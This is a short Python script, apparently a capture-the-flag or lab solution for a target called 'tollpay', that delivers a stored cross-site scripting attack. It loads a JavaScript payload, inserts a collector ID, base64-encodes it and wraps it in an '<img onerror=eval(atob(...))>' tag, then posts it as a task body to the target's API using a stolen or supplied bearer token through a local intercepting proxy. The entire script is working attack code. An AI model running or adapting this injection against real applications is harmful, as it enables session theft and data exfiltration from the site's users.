import sys
import base64
# pip install requests
import requests

PROXY = "http://127.0.0.1:8080"

target = sys.argv[1]
token = sys.argv[2]
collect_id = sys.argv[3]

js = open("tollpay-solution/xss_payload.js").read().replace("COLLECT_ID", collect_id)
payload = base64.b64encode(js.encode()).decode()
body = "<img src=x onerror=\"eval(atob('" + payload + "'))\">"

r = requests.post(target + "/api/v1/tasks",
                  headers={"Authorization": "Bearer " + token},
                  json={"title": "dispute review", "body": body},
                  proxies={"http": PROXY, "https": PROXY})
print(r.status_code, r.text)
